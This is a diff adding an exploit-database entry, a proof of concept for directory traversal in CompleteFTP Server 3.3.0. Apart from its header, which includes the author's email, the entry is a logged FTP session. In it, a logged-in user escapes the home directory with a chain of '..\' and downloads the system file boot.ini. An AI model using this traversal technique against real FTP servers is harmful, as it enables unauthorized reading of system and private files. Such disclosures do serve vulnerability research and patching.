@@ -1,0 +1,18 @@
+# Exploit Title: CompleteFTP Server Directory Traversal
+# Date: 2010-03-30
+# Author: zombiefx darkernet@gmail.com<mailto:darkernet@gmail.com>
+# Software Link: http://www.enterprisedt.com/products/completeftp/download/CompleteFTPSetup.exe
+# Version: CompleteFTP Server v 3.3.0
+# Tested on: Windows XP SP3
+# CVE :
+# Code :
+230 User test logged in.
+ftp> pwd
+257 "/Home/test" is current directory.
+ftp> cd ..\..\..\..\..\..\..\..\
+250 Directory changed to "/Home/test/..\..\..\..\..\..\..\..\".
+ftp> get boot.ini
+200 PORT command successful.
+150 Opening ASCII mode data connection for boot.ini
+226 Transfer complete.
+ftp: 215 bytes received in 0.14Seconds 1.54Kbytes/sec.
